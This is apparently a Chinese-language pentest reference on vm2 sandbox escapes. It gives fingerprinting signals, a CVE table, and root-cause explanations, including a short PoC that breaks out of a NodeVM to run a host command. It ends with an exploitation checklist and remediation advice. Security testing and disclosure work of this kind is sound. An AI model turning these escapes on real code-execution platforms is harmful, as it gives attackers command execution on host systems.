# RCE 子类 — Node.js 沙箱逃逸(vm2 系) `sandbox-escape`

> 适用场景:目标用 vm2 / NodeVM 跑**不可信 JS**——AI agent 代码执行沙箱、在线 IDE/判题器、低代码平台自定义脚本、SSR 插件系统。
> 2026 年 vm2 爆发逃逸波(13+ CVE,CVSS 9.1→9.8→10.0),修复集中在 **3.11.4**(2026-05-18),最新 3.11.5。
> 原则同全局:payload/链路来自本文件与 GHSA 报告,不凭记忆。

---

## 1. 指纹识别(怎么确认目标是 vm2)

| 信号 | 依据 |
|---|---|
| 响应/报错含 `VMError`、`vm2`、`NodeVM`、`VMSandbox` | vm2 特有异常类名 |
| 堆栈含 `bridge.js`、`setup-sandbox.js`、`contextify.js` | vm2 内部文件名 |
| package.json / bundle 里有 `vm2`、`@usebruno/vm2`(fork 同样受影响) | 依赖声明 |
| 业务形态:用户提交代码→平台执行(AI agent 工具调用、在线运行按钮) | 架构特征,无指纹也可试 |

## 2. CVE 速查表(2026 波,≤3.11.3 全中)

| CVE | CVSS | 机制 | 关键条件 | 修复 commit / GHSA |
|---|---|---|---|---|
| **CVE-2026-47137** | **10.0** Critical | nesting 检查被 `=== false` 绕过(见 §3) | 外层 `NodeVM({nesting:true})` 且 `require` 未显式传 | `01a7552`+`86ab819` / GHSA-m4wx-m65x-ghrr |
| CVE-2026-47209 | 8.6 High | Bridge Proxy `set` trap 忽略 `receiver`,写入穿透到宿主对象 | 沙箱内可 `Object.create(桥接代理)` 并写 symbol 属性 | `26d0318` / GHSA-c4cf-2hgv-2qv6 |
| CVE-2026-47135 | 8.7 High | `Symbol.for` 只拦 2/9 个危险 symbol;写向 trap(`set`/`defineProperty`/`deleteProperty`)无危险 symbol 检查 | 宿主会对沙箱可改函数调 `util.promisify` 等 | `928aef5` / GHSA-m5q2-4fm3-vfqp |

历史脉络:47137 绕过的正是 **CVE-2023-37903** 的补丁(`nodevm.js:263` 的 nesting 检查);2022–2023 波(`CVE-2022-36067` Proxy 逃逸、`CVE-2023-32314` Promise handler 逃逸)同根:vm2 的 bridge 层做不完跨 realm 语义。

## 3. CVE-2026-47137 — nesting 绕过(满分,单文件 PoC)

**根因**:`nodevm.js:263` 检查 `options.require === false`,但 `require` 未传时值为 `undefined`,`undefined === false` 为假,检查跳过;第 280 行解构默认值 `require: requireOpts = false` 又把运行时行为折叠成 `false`。**检查用的值和解构后的值不一致**——严格相等比解构默认值先执行,这就是缝。

```js
// 外层:只传 nesting:true,不传 require → 守卫被跳过
const nvm = new NodeVM({ nesting: true });
nvm.run(`
  // nesting:true 激活 NESTING_OVERRIDE,沙箱内可 require('vm2') 本体
  const { NodeVM } = require('vm2');
  // 内层沙箱配置独立,无继承限制 → 给它 child_process
  const inner = new NodeVM({ require: { builtin: ['child_process'] } });
  module.exports = inner.run(
    "module.exports = require('child_process').execSync('id').toString()"
  );
`);
```

利用四步:外层绕守卫 → 沙箱内拿到 vm2 库 → 构造宽松内层 → 宿主命令执行。PoC 见 GHSA-m4wx-m65x-ghrr(作者 @q1uf3ngONEKEY)。

**变体意识**:同理检查 `nesting` 传 `1`/`'yes'` 等真值非 `true`、`require` 传原始类型(`true`/`1`)——3.11.4 补丁(`86ab819`)才把这些一并堵上,≤3.11.3 都可试。

## 4. CVE-2026-47209 — set trap receiver 穿透

ECMA-262 §9.5.9:经过原型链到达 Proxy 的写入,`set` trap 会收到 `receiver`(发起对象),规范要求 receiver ≠ proxy 时在 **receiver 上**建自有属性。vm2 的 `bridge.js:1231` `BaseHandler.set` 无视 receiver,直接 `otherReflectSet` 打在**宿主对象**上:

```js
// 沙箱内:子对象继承桥接代理 → 写入穿透到宿主
const child = Object.create(bridgedProxy);
child[Symbol.for('nodejs.util.promisify.custom')] = payload; // 写到宿主了
```

最高危向量:写跨 realm symbol(`nodejs.util.promisify.custom`)——绕过直写路径上的 `isDangerousCrossRealmSymbol` 守卫,造成宿主内建函数语义混乱,可链到宿主 RCE("Prompts Become Shells",对 AI agent 场景)。

## 5. CVE-2026-47135 — 跨 realm symbol 劫持(双层缺口)

- **缺口 1**:`setup-sandbox.js` 的 `Symbol.for` 覆写只拦 `nodejs.util.inspect.custom`、`nodejs.rejection` 两个;`nodejs.util.promisify.custom`、`nodejs.stream.readable/.writable/.duplex/.transform`、`nodejs.webstream.*` 等 7 个漏到真 symbol。
- **缺口 2**:`bridge.js` 读向 trap(`get`/`ownKeys`)查了危险 symbol,写向 trap(`set`/`defineProperty`/`deleteProperty`)没查。

攻击链:沙箱拿真 `promisify.custom` symbol → 经未设防 `set` 写恶意回调到宿主函数 → 宿主调 `util.promisify` 时执行沙箱代码。非直接 RCE(AC:H),需宿主配合调用,但 S:C 且 C:H/I:H。

## 6. 利用条件自查(全中才打得通)

- [ ] 目标在 vm2(≤3.11.3)里跑用户可控 JS
- [ ] `NodeVM` 构造参数可知/可猜(源码、开源平台、文档)
- [ ] 47137:`nesting:true` 且 `require` 未显式配置
- [ ] 47209/47135:沙箱可触达桥接宿主对象(默认配置多数可达)
- [ ] 出口:命令执行后按 intranet-postexp 流程走,证据链照旧(HTTP 包/回显截图)

## 7. 修复与加固(报告里写给厂商的)

1. 升级 **vm2 ≥ 3.11.4**(3.11.5 更稳);`@usebruno/vm2` fork 同样受影响,别当缓解项
2. 治本:vm2 是 AST 级模拟沙箱,2023 年起作者已宣布放弃安全维护路线——迁 `isolated-vm`(V8 isolate)、子进程+容器、gVisor/Firecracker
3. 兜底:宿主侧禁 `child_process`/`eval`/`Function` 构造器暴露;egress 白名单

## 8. 来源

- GHSA-m4wx-m65x-ghrr / GHSA-c4cf-2hgv-2qv6 / GHSA-m5q2-4fm3-vfqp(GitHub Advisory,含 repro 测试)
- commits:`01a7552` `86ab819`(47137)、`26d0318`(47209)、`928aef5`(47135),作者 Patrik Šimek
- Red Hat CVE 页、SentinelOne 数据库、zeropath 分析(注:zeropath 页面自述 AI 生成,细节已与 GHSA/commit 交叉核对)
